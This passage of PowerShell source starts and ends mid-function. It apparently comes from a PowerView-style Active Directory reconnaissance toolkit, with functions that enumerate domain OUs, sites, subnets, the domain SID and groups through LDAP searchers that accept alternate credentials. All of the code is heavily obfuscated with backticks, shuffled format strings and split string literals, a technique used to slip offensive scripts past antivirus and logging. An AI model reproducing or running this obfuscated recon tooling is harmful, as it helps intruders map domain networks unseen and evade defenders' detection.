                &("{3}{1}{2}{0}"-f'se','rit','e-Verbo','W') ('[G'+'et-Dom'+'a'+'inOU'+'] '+'Searc'+'hin'+'g '+'fo'+'r '+'OU'+'s '+'with'+' '+"$GPLink "+'se'+'t '+'i'+'n '+'th'+'e '+'gp'+'Link '+'pr'+'oper'+'ty')
                ${FiL`T`ER} += "(gplink=*$GPLink*)"
            }

            if (${pSB`oUnDpARA`mETE`RS}[("{3}{1}{0}{2}" -f'F','DAP','ilter','L')]) {
                &("{1}{0}{3}{2}"-f'e-V','Writ','rbose','e') ('[Get-Do'+'m'+'ainO'+'U'+'] '+'U'+'sing '+'additio'+'n'+'a'+'l '+'LDAP'+' '+'fil'+'t'+'er: '+"$LDAPFilter")
                ${fI`lT`Er} += "$LDAPFilter"
            }

            ${ous`eArC`HEr}."fiL`T`eR" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{3}{0}{2}{1}" -f 'rbo','e','s','Write-Ve') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${PSBoundpa`RAM`Ete`Rs}[("{0}{2}{1}" -f'F','e','indOn')]) { ${R`eSUL`Ts} = ${oU`se`ArchER}.("{0}{1}" -f 'Fin','dOne').Invoke() }
            else { ${R`eSuL`Ts} = ${oU`sE`ARchER}.("{0}{2}{1}"-f'F','ll','indA').Invoke() }
            ${rEsu`l`Ts} | &("{1}{2}{0}" -f 'ct','Where-','Obje') {${_}} | &("{2}{1}{3}{0}" -f 't','orEac','F','h-Objec') {
                if (${pSb`oUndPaR`A`MEt`eRs}['Raw']) {
                    
                    ${ou} = ${_}
                }
                else {
                    ${o`U} = &("{1}{2}{3}{0}" -f'perty','Conve','rt-LDAPP','ro') -Properties ${_}."PROPErT`i`eS"
                }
                ${OU}."psobj`e`ct"."TypE`Na`mES".("{0}{1}"-f'Inse','rt').Invoke(0, ("{1}{0}{2}"-f 'View.','Power','OU'))
                ${OU}
            }
            if (${r`EsUL`TS}) {
                try { ${Res`U`LTs}.("{1}{2}{0}" -f 'se','di','spo').Invoke() }
                catch {
                    &("{1}{2}{0}"-f'e-Verbose','Wri','t') ('['+'Get-D'+'omai'+'nOU] '+'E'+'rror'+' '+'di'+'spos'+'ing '+'of'+' '+'t'+'he '+'Result'+'s '+'objec'+'t:'+' '+"$_")
                }
            }
            ${OUs`EaRc`heR}.("{0}{2}{1}" -f 'dispo','e','s').Invoke()
        }
    }
}


function GeT-`DO`MaI`NSiTe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f 'PSSho','s','ul','dProces'}, '')]
    [OutputType({"{2}{0}{3}{1}"-f 'r','iew.Site','Powe','V'})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSItION = 0, vALuEFROmPIPELiNe = ${tr`UE}, VALuefrOMpipeliNeBYproPerTYNAmE = ${t`RUE})]
        [Alias({"{1}{0}"-f'ame','N'})]
        [String[]]
        ${I`De`NtitY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f 'ID','GU'})]
        ${G`Pl`inK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`Main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filte','r'})]
        [String]
        ${LdApfiL`T`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROPer`TI`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'DSPath','A'})]
        [String]
        ${sEa`RcHb`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{4}{0}{2}" -f 'olle','Do','r','mainCon','tr'})]
        [String]
        ${se`RveR},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{0}{2}" -f 'L','One','evel'}, {"{1}{0}" -f 'ree','Subt'})]
        [String]
        ${S`E`ARcHs`Cope} = ("{0}{1}" -f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsUltpA`G`eSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`ErT`iMElI`mIt},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}" -f'Gro','up'}, {"{1}{0}"-f 'e','Non'}, {"{1}{0}" -f'ner','Ow'}, {"{0}{1}"-f'Sac','l'})]
        [String]
        ${SEcU`RiTYm`Asks},

        [Switch]
        ${T`O`MbStONE},

        [Alias({"{1}{2}{0}"-f 'ne','R','eturnO'})]
        [Switch]
        ${fi`N`dOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDeNt`i`Al} =  (  Get-varIABle  0dsQR  -vA )::"E`MPTy",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SEARchera`RG`U`mEN`TS} = @{
            ("{4}{3}{1}{0}{2}"-f 'eP','Bas','refix','rch','Sea') = ("{2}{4}{1}{0}{3}{5}" -f '=Con','es,CN','C','figur','N=Sit','ation')
        }
        if (${PsBo`UNDp`A`RamE`TE`Rs}[("{1}{0}"-f'ain','Dom')]) { ${S`EaRCH`E`RargumEnts}[("{1}{0}"-f 'main','Do')] = ${dom`Ain} }
        if (${ps`BOUN`dpaRaMEte`RS}[("{2}{0}{1}{3}"-f 'o','pe','Pr','rties')]) { ${seaR`c`herA`RgUmE`Nts}[("{1}{2}{0}"-f 'es','P','roperti')] = ${PR`opER`TI`eS} }
        if (${p`sbounD`PAraMe`T`eRs}[("{1}{2}{0}"-f'e','Se','archBas')]) { ${SE`Ar`c`HeRARgU`m`Ents}[("{1}{2}{0}"-f'se','S','earchBa')] = ${SeaRC`h`BA`Se} }
        if (${P`sb`oUN`dpAra`meters}[("{0}{1}"-f'Se','rver')]) { ${SeArc`h`erA`RguMeNtS}[("{1}{0}" -f'r','Serve')] = ${SeRV`er} }
        if (${p`sB`ouNdp`Arame`TerS}[("{3}{0}{1}{2}"-f'c','h','Scope','Sear')]) { ${SEAr`C`hEr`Ar`GUm`ENTs}[("{2}{0}{1}"-f'ear','chScope','S')] = ${SEarChs`c`OPE} }
        if (${P`SboUN`D`PaRAMEtE`RS}[("{2}{3}{1}{0}{4}"-f'iz','eS','Result','Pag','e')]) { ${se`AR`c`heraR`gUm`ENts}[("{2}{1}{0}" -f'e','Siz','ResultPage')] = ${reS`Ul`TPa`Ges`IZe} }
        if (${PS`BoUndPAr`A`Me`T`ers}[("{1}{2}{3}{0}" -f'it','Serv','erTimeL','im')]) { ${SEaRCH`eR`ArGU`mENts}[("{3}{2}{1}{0}{4}" -f 'im','T','erver','S','eLimit')] = ${SERv`er`T`IMEli`mIt} }
        if (${pS`Bou`N`dparAm`e`TeRS}[("{0}{1}{2}{3}"-f'Sec','urity','Ma','sks')]) { ${SE`ArCHeRa`RguME`Nts}[("{0}{2}{1}"-f'S','rityMasks','ecu')] = ${SEcu`RIT`YmA`S`kS} }
        if (${PSb`ou`N`DpARAmETe`Rs}[("{0}{1}{2}" -f 'Tomb','s','tone')]) { ${SeArc`He`RArGU`MenTS}[("{2}{3}{1}{0}" -f 'e','on','Tom','bst')] = ${t`oMBsTO`NE} }
        if (${ps`B`ou`N`dParAMete`Rs}[("{0}{1}{2}"-f'Cr','eden','tial')]) { ${SEArc`HEraRGU`m`ENTS}[("{1}{0}{3}{2}"-f'nti','Crede','l','a')] = ${c`REDE`N`TIaL} }
        ${sI`TE`SEaRcher} = &("{3}{2}{1}{0}"-f 'rcher','nSea','t-Domai','Ge') @SearcherArguments
    }

    PROCESS {
        if (${sI`TesEa`RCh`eR}) {
            ${id`ENTi`TYFiL`Ter} = ''
            ${FI`lt`eR} = ''
            ${Id`en`T`Ity} | &("{1}{3}{0}{2}" -f'Obje','Wh','ct','ere-') {${_}} | &("{1}{4}{0}{3}{2}" -f'rEac','F','ject','h-Ob','o') {
                ${id`e`NtiT`YI`NStanCe} = ${_}.("{2}{0}{1}" -f 'lac','e','Rep').Invoke('(', '\28').("{1}{0}{2}" -f 'c','Repla','e').Invoke(')', '\29')
                if (${IdeNtIt`YI`NsTa`NCe} -match ("{1}{0}"-f'.*','^CN=')) {
                    ${idE`NtIt`yfIl`TER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSb`O`UndParA`mET`ERS}[("{0}{1}"-f 'Domai','n')]) -and (-not ${P`SBOU`NdPArAm`etE`RS}[("{0}{2}{1}" -f'SearchB','e','as')])) {
                        
                        
                        ${ide`Nt`itydOMa`IN} = ${id`ENTI`T`Yi`NstANce}.("{0}{1}{2}" -f'Sub','Strin','g').Invoke(${idENti`TY`inStan`Ce}.("{2}{1}{0}" -f'dexOf','n','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{4}{2}{0}{1}" -f's','e','rbo','W','rite-Ve') ('[Get-Doma'+'in'+'Sit'+'e]'+' '+'Extra'+'ct'+'ed'+' '+'dom'+'a'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${SEArch`ERARgu`m`E`NTs}[("{0}{2}{1}"-f'D','ain','om')] = ${Id`en`Ti`TydoMA`iN}
                        ${Si`TeSea`Rch`ER} = &("{4}{3}{0}{1}{2}" -f 'mainS','ear','cher','t-Do','Ge') @SearcherArguments
                        if (-not ${SI`T`eseArC`h`er}) {
                            &("{0}{3}{1}{2}"-f 'W','i','te-Warning','r') ('['+'Get-'+'DomainSi'+'te] '+'Un'+'able'+' '+'to'+' '+'r'+'et'+'rieve '+'do'+'m'+'ain '+'se'+'ar'+'cher'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GuIDBYt`E`S`TRIng} = (-Join (([Guid]${Id`entitY`instAn`cE}).("{1}{2}{0}" -f 'y','ToBy','teArra').Invoke() | &("{0}{3}{1}{2}"-f'For','Obj','ect','Each-') {${_}.("{2}{0}{1}" -f 'tri','ng','ToS').Invoke('X').("{0}{1}" -f'P','adLeft').Invoke(2,'0')})) -Replace (("{1}{0}" -f'..)','(')),'\$1'
                        ${I`dEN`TI`T`YfILTER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iDeN`Tit`yf`iLTeR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ID`e`NtIty`FilteR} -and (${IDe`NtI`T`YFIL`TER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${FiL`Ter} += "(|$IdentityFilter)"
            }

            if (${P`SBoU`NDp`ARAMET`ERs}[("{0}{1}"-f'G','PLink')]) {
                &("{1}{0}{2}"-f '-V','Write','erbose') ('[Get-Dom'+'ainSite'+']'+' '+'Se'+'archin'+'g '+'for'+' '+'site'+'s '+'wit'+'h '+"$GPLink "+'s'+'et '+'i'+'n '+'t'+'he '+'gpL'+'ink '+'pr'+'oper'+'ty')
                ${Fi`lTER} += "(gplink=*$GPLink*)"
            }

            if (${Ps`B`ouNDPaRA`mE`TeRS}[("{0}{2}{1}"-f 'LDA','ter','PFil')]) {
                &("{0}{2}{1}"-f 'W','se','rite-Verbo') ('[Get-'+'Domai'+'n'+'Site'+'] '+'U'+'s'+'ing '+'a'+'ddit'+'ional '+'L'+'DAP '+'fi'+'l'+'ter: '+"$LDAPFilter")
                ${F`ilT`er} += "$LDAPFilter"
            }

            ${SIt`esE`ARCHer}."f`iLtER" = "(&(objectCategory=site)$Filter)"
            &("{3}{1}{0}{2}" -f'erb','te-V','ose','Wri') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${P`SbouNdp`A`R`AmETE`Rs}[("{0}{1}{2}"-f 'Fi','ndOn','e')]) { ${R`Es`ULTS} = ${sITe`Sea`R`cHeR}.("{1}{0}" -f 'ndAll','Fi').Invoke() }
            else { ${R`esu`LTS} = ${si`T`E`s`EarchER}.("{0}{1}"-f'Fi','ndAll').Invoke() }
            ${RE`sUl`TS} | &("{0}{1}{2}{3}"-f 'Where-','O','bj','ect') {${_}} | &("{2}{1}{0}{3}" -f'ch-','orEa','F','Object') {
                if (${psBOU`Nd`ParAMeT`erS}['Raw']) {
                    
                    ${S`Ite} = ${_}
                }
                else {
                    ${si`TE} = &("{4}{5}{0}{3}{2}{1}" -f'AP','ty','roper','P','Conver','t-LD') -Properties ${_}."pR`oPeRt`IES"
                }
                ${S`iTE}."P`s`OBJect"."Ty`p`ENAMES".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{3}{0}{2}{1}" -f 'er','te','View.Si','Pow'))
                ${si`Te}
            }
            if (${R`eSuL`TS}) {
                try { ${r`EsULTs}.("{0}{1}" -f 'di','spose').Invoke() }
                catch {
                    &("{2}{4}{3}{1}{0}"-f'e','rbos','W','e','rite-V') ("{9}{8}{4}{5}{6}{2}{3}{0}{1}{7}"-f 'ul','ts ','s','ing of the Res','ainSit','e] Error di','spo','object','et-Dom','[G')
                }
            }
            ${sItEs`earc`H`Er}.("{1}{0}" -f 'e','dispos').Invoke()
        }
    }
}


function geT-`DOM`AiNs`UBNEt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f 'ro','PSShoul','cess','dP'}, '')]
    [OutputType({"{4}{3}{1}{2}{0}" -f'et','iew.S','ubn','werV','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(POsitIon = 0, VALuEFROmPIPEliNE = ${tR`Ue}, ValUEfRoMPipeLINEbYPrOPertyNaME = ${tR`Ue})]
        [Alias({"{1}{0}" -f 'ame','N'})]
        [String[]]
        ${iD`en`TITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sIte`Na`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${lDapfI`l`T`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`oP`ERTI`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'ADSP','a','th'})]
        [String]
        ${s`EARC`HbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f 'ntr','ol','DomainCo','ler'})]
        [String]
        ${SEr`V`Er},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{0}{1}" -f 'On','eLevel'}, {"{2}{1}{0}"-f'e','re','Subt'})]
        [String]
        ${S`Earch`Sco`pe} = ("{1}{2}{0}"-f 'e','Sub','tre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESuLtP`AgeSi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`V`ertIMelIm`it},

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{0}{1}"-f 'Gro','up'}, {"{0}{1}" -f'N','one'}, {"{0}{1}" -f 'Ow','ner'}, {"{1}{0}"-f'cl','Sa'})]
        [String]
        ${sEC`URItYm`AS`ks},

        [Switch]
        ${tomb`s`TonE},

        [Alias({"{1}{2}{0}" -f 'e','Return','On'})]
        [Switch]
        ${fIN`DO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`en`TiaL} =  (  get-VARIAbLe  ('0D'+'sqR') -VA)::"EMP`TY",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${S`eA`RcHERaR`GuM`en`Ts} = @{
            ("{1}{3}{2}{0}" -f'fix','Se','e','archBasePr') = ("{4}{6}{0}{5}{1}{3}{2}{10}{8}{7}{9}" -f ',','N','es,C','=Sit','CN=S','C','ubnets','t','figura','ion','N=Con')
        }
        if (${Ps`BoUNDPARA`mET`eRs}[("{1}{0}{2}" -f'a','Dom','in')]) { ${s`EARc`hE`R`A`RguMeNTS}[("{0}{1}"-f'Domai','n')] = ${D`OmaIn} }
        if (${PSB`O`U`Nd`pARAmeteRs}[("{0}{2}{1}{3}"-f 'Pr','e','operti','s')]) { ${S`ea`RChERa`RGumEn`TS}[("{2}{1}{3}{0}" -f'es','op','Pr','erti')] = ${prO`P`ErTIes} }
        if (${P`sbOUNDP`A`RamET`ERS}[("{2}{1}{0}" -f'se','rchBa','Sea')]) { ${S`ea`R`cHERarGUmenTs}[("{2}{1}{0}" -f'archBase','e','S')] = ${se`A`RCHbAse} }
        if (${pSbO`U`Ndpa`RAmeTe`Rs}[("{1}{0}{2}"-f 'e','Serv','r')]) { ${SeaRch`er`A`RGum`eNTs}[("{0}{1}" -f 'S','erver')] = ${s`E`RVEr} }
        if (${PsBou`NdP`AR`A`ME`Ters}[("{1}{0}{2}"-f'ar','Se','chScope')]) { ${SeArche`RA`RGume`Nts}[("{1}{2}{0}" -f 'hScope','Sear','c')] = ${sea`RchS`c`OPe} }
        if (${PsB`ounD`pAram`etErS}[("{0}{1}{3}{4}{2}" -f 'R','e','eSize','sul','tPag')]) { ${SeArC`H`erA`Rgume`NTs}[("{0}{2}{1}{3}"-f'Res','z','ultPageSi','e')] = ${rEsUlt`PAGes`I`ZE} }
        if (${pSB`o`UNDPAR`AMeTERS}[("{2}{3}{1}{0}"-f 'TimeLimit','ver','Se','r')]) { ${s`EAr`CH`er`ARGUME`Nts}[("{2}{1}{4}{0}{3}"-f 'i','m','ServerTi','t','eLim')] = ${SerVErTiMe`li`MiT} }
        if (${PSbOund`Pa`R`Ame`T`eRs}[("{2}{1}{0}" -f'sks','tyMa','Securi')]) { ${s`EArcHeRa`Rg`UmE`NtS}[("{0}{2}{1}"-f'Securi','sks','tyMa')] = ${s`e`CuRITYMAS`kS} }
        if (${ps`Bo`Un`dPAraMeTE`Rs}[("{1}{0}{2}"-f't','Tombs','one')]) { ${seaRcHe`R`ARGu`mE`NTS}[("{2}{0}{1}" -f 'mb','stone','To')] = ${TO`mb`Sto`Ne} }
        if (${PsBoun`D`p`Ara`METerS}[("{1}{0}{2}{3}" -f'reden','C','ti','al')]) { ${SEa`RcHEraRg`U`m`eNTs}[("{1}{0}{2}"-f 'eden','Cr','tial')] = ${cR`EDE`Nti`Al} }
        ${SUb`Ne`Ts`eArC`hER} = &("{4}{3}{1}{0}{2}" -f 'h','arc','er','inSe','Get-Doma') @SearcherArguments
    }

    PROCESS {
        if (${su`Bn`Ets`Earc`Her}) {
            ${idE`Nt`Ity`Fi`LtEr} = ''
            ${FiLt`eR} = ''
            ${iDE`NTi`Ty} | &("{3}{1}{0}{2}"-f 'ere-Ob','h','ject','W') {${_}} | &("{1}{2}{0}{3}"-f 'rEa','F','o','ch-Object') {
                ${id`e`NtITY`InStance} = ${_}.("{1}{0}" -f'eplace','R').Invoke('(', '\28').("{0}{1}"-f'Repla','ce').Invoke(')', '\29')
                if (${idEN`T`iTyins`TANcE} -match ("{1}{0}" -f '=.*','^CN')) {
                    ${IdeNTiT`y`F`IlT`ER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`sboUNdp`Ar`AMET`erS}[("{0}{1}"-f 'Domai','n')]) -and (-not ${PSBou`ND`p`ArametErS}[("{3}{0}{1}{2}"-f 'e','arc','hBase','S')])) {
                        
                        
                        ${id`en`T`It`yDOMaIN} = ${ideNT`itY`i`NSTANCE}.("{2}{1}{0}"-f 'g','trin','SubS').Invoke(${IDent`ItYIn`s`TaNCe}.("{0}{1}"-f 'In','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{0}{2}" -f 'e-','Writ','Verbose') ('[Get'+'-Do'+'mainS'+'ub'+'net] '+'E'+'xtracte'+'d '+'d'+'omai'+'n '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${seARc`hE`RARgu`ME`NTS}[("{2}{1}{0}"-f 'n','omai','D')] = ${I`DE`NT`It`YDoMaIn}
                        ${su`B`NET`S`earChEr} = &("{2}{1}{4}{3}{0}" -f'rcher','Do','Get-','nSea','mai') @SearcherArguments
                        if (-not ${suBn`eTSeA`R`Ch`er}) {
                            &("{2}{1}{0}{3}"-f 'e-Warni','it','Wr','ng') ('[Get-D'+'omainSu'+'bn'+'e'+'t] '+'Unable'+' '+'to'+' '+'re'+'triev'+'e '+'d'+'o'+'main '+'searche'+'r '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gUid`By`T`e`sTRiNG} = (-Join (([Guid]${IdentITY`i`NsTAN`CE}).("{2}{0}{1}"-f 'eAr','ray','ToByt').Invoke() | &("{2}{0}{1}" -f'h-O','bject','ForEac') {${_}.("{1}{0}{2}" -f'tr','ToS','ing').Invoke('X').("{0}{1}"-f'Pad','Left').Invoke(2,'0')})) -Replace ("{0}{1}" -f '(..',')'),'\$1'
                        ${iDEN`T`iTy`FIltEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iDe`N`TITY`Fil`Ter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ideN`T`ItyFiL`T`ER} -and (${iDe`NTity`Fi`LtEr}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') ) {
                ${F`iLT`Er} += "(|$IdentityFilter)"
            }

            if (${PsBO`UN`dpAr`AmEtERs}[("{1}{2}{0}" -f'lter','LD','APFi')]) {
                &("{0}{1}{2}" -f 'Write-V','erbo','se') ('[Get-Domain'+'Subne'+'t'+']'+' '+'Using'+' '+'additi'+'on'+'al '+'LD'+'AP '+'filter'+':'+' '+"$LDAPFilter")
                ${f`ilTer} += "$LDAPFilter"
            }

            ${subnets`E`A`RcHEr}."fi`LtER" = "(&(objectCategory=subnet)$Filter)"
            &("{2}{1}{0}"-f'ose','ite-Verb','Wr') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${P`sBOun`dParaMeT`E`Rs}[("{0}{1}"-f 'FindO','ne')]) { ${RE`SuL`Ts} = ${S`UbnET`searc`her}.("{1}{0}{2}" -f'indO','F','ne').Invoke() }
            else { ${re`Sults} = ${SU`Bn`EtSeArch`eR}.("{1}{2}{0}" -f 'l','FindA','l').Invoke() }
            ${REs`UL`Ts} | &("{1}{2}{0}"-f 't','Where-Obj','ec') {${_}} | &("{1}{2}{3}{0}" -f 'Object','For','E','ach-') {
                if (${p`s`BoUNdp`ARam`et`ERs}['Raw']) {
                    
                    ${sUBN`eT} = ${_}
                }
                else {
                    ${S`UB`Net} = &("{4}{0}{3}{2}{1}" -f 't-LDA','y','pert','PPro','Conver') -Properties ${_}."PrOPE`R`TIES"
                }
                ${SU`Bnet}."PsObj`E`CT"."typENA`mEs".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{2}{3}{4}{1}{0}" -f'ubnet','ew.S','P','owerV','i'))

                if (${PSBOUn`d`pAr`A`mEters}[("{0}{1}"-f'SiteNa','me')]) {
                    
                    
                    if (${S`UB`NeT}."P`R`op`erTIes" -and (${su`Bn`et}."PRo`p`ert`ies"."S`IteOb`JEct" -like "*$SiteName*")) {
                        ${Sub`Net}
                    }
                    elseif (${s`U`BNET}."siTeO`BjE`cT" -like "*$SiteName*") {
                        ${SU`B`NET}
                    }
                }
                else {
                    ${sUB`N`et}
                }
            }
            if (${R`eS`ULtS}) {
                try { ${res`U`LtS}.("{0}{2}{1}" -f 'disp','e','os').Invoke() }
                catch {
                    &("{4}{1}{3}{2}{0}"-f'e','rite','erbos','-V','W') ('[Get-D'+'omai'+'nSubne'+'t] '+'E'+'rror'+' '+'dispo'+'si'+'ng '+'of'+' '+'t'+'he '+'Re'+'sul'+'ts '+'ob'+'ject:'+' '+"$_")
                }
            }
            ${s`Ubnets`eaRc`her}.("{2}{0}{1}" -f'ispos','e','d').Invoke()
        }
    }
}


function G`ET-doMAi`N`sid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{2}{0}"-f'ss','ld','Proce','Shou','PS'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{0}{3}{1}" -f 'troll','r','Con','e','Domain'})]
        [String]
        ${SE`R`VeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dEnt`iAL} =  (GeT-VaRIablE  0DSQR).valUe::"Em`pty"
    )

    ${SE`ARchErArGu`m`eN`Ts} = @{
        ("{0}{2}{1}" -f 'LDA','ilter','PF') = ("{2}{4}{0}{1}{5}{6}{7}{3}{10}{12}{9}{11}{8}" -f'untC','ont','(userAc','6','co','rol:','1.2.840.113','55',')','19','.1.','2','4.803:=8')
    }
    if (${PsbOu`Ndp`A`RAME`TE`RS}[("{1}{0}" -f 'main','Do')]) { ${s`EArchER`ArGUmE`Nts}[("{0}{1}" -f'Do','main')] = ${DO`main} }
    if (${PsBO`U`ND`paRa`me`TerS}[("{0}{1}"-f 'S','erver')]) { ${SEArc`H`ERArG`U`Me`NtS}[("{1}{0}"-f'r','Serve')] = ${SE`RVeR} }
    if (${Ps`B`ou`NDpAraMeteRs}[("{0}{2}{1}" -f'Crede','l','ntia')]) { ${S`eA`R`cHe`RArGUMents}[("{1}{2}{0}"-f 'l','C','redentia')] = ${Cre`De`NTI`Al} }

    ${D`CSiD} = &("{4}{1}{5}{2}{3}{0}"-f'er','nC','mpu','t','Get-Domai','o') @SearcherArguments -FindOne | &("{0}{2}{1}"-f'Select','ect','-Obj') -First 1 -ExpandProperty ("{2}{1}{0}" -f'sid','ct','obje')

    if (${Dcs`iD}) {
        ${dC`s`ID}.("{0}{2}{1}"-f 'Sub','ng','Stri').Invoke(0, ${D`CSid}.("{0}{2}{1}" -f'L','exOf','astInd').Invoke('-'))
    }
    else {
        &("{0}{1}{2}" -f 'W','rite-Ver','bose') ('[Get-'+'D'+'omainS'+'ID]'+' '+'Error'+' '+'ext'+'ra'+'cting'+' '+'dom'+'ain'+' '+'S'+'ID '+'for'+' '+"'$Domain'")
    }
}


function gEt`-Dom`AI`NG`ROup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f 'dPro','PSSho','ul','cess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{9}{1}{2}{10}{8}{0}{7}{6}{5}{3}" -f'i','ared','V','ts','PSUseD','n','me','gn','MoreThanAss','ecl','ars'}, '')]
    [OutputType({"{2}{0}{3}{1}" -f'Vi','up','Power','ew.Gro'})]
    [CmdletBinding(dEfaUltPArAMETERsETName = {"{0}{1}{3}{2}" -f 'Allo','wD','ion','elegat'})]
    Param(
        [Parameter(PositIoN = 0, VaLUEfROmpIpEline = ${Tr`Ue}, VALueFrOMpipeLINEByPROpertyname = ${T`RUE})]
        [Alias({"{2}{3}{0}{1}" -f 'dNa','me','Distinguis','he'}, {"{0}{2}{1}{3}" -f'Sa','tNam','mAccoun','e'}, {"{1}{0}"-f'me','Na'}, {"{6}{5}{0}{3}{1}{4}{2}"-f'erDi','ing','e','st','uishedNam','mb','Me'}, {"{2}{1}{0}"-f'me','rNa','Membe'})]
        [String[]]
        ${Ident`iTY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'me','Us','erNa'})]
        [String]
        ${m`EMberI`deN`TIty},

        [Switch]
        ${aD`MiNc`oUnT},

        [ValidateSet({"{1}{2}{0}"-f'nLocal','Dom','ai'}, {"{2}{3}{1}{0}" -f 'al','ainLoc','NotDo','m'}, {"{1}{0}{2}" -f'l','G','obal'}, {"{1}{3}{2}{0}" -f'Global','N','t','o'}, {"{0}{2}{1}"-f 'Un','sal','iver'}, {"{2}{0}{1}{3}" -f'Uni','ver','Not','sal'})]
        [Alias({"{1}{0}"-f'cope','S'})]
        [String]
        ${GR`ouPs`CO`pE},

        [ValidateSet({"{1}{0}{2}" -f'curi','Se','ty'}, {"{3}{1}{0}{2}"-f'tio','tribu','n','Dis'}, {"{0}{1}{2}{3}"-f'Crea','tedBy','Syst','em'}, {"{2}{0}{1}{4}{3}" -f 'otCrea','tedB','N','m','ySyste'})]
        [String]
        ${gR`o`UPpRo`p`erty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${ld`A`PfiLTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROP`eRTi`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'h','Pat','ADS'})]
        [String]
        ${s`ea`RCHbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}{4}" -f 'm','ai','nCon','Do','troller'})]
        [String]
        ${Serv`Er},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{0}{1}" -f 'One','Level'}, {"{1}{0}" -f 'e','Subtre'})]
        [String]
        ${se`ARCHSC`O`pE} = ("{0}{1}" -f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESult`PAG`es`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRVer`T`im`eliMit},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}" -f 'No','ne'}, {"{0}{1}" -f'Own','er'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${se`CUr`ITYMasKS},

        [Switch]
        ${to`m`BSTO`NE},

        [Alias({"{1}{0}{2}" -f'u','Ret','rnOne'})]
        [Switch]
        ${f`iNDO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedenT`iAl} =   ( GET-VARiaBLe  0DSqR -Va )::"em`PTY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${seA`RcHerA`RGumEN`Ts} = @{}
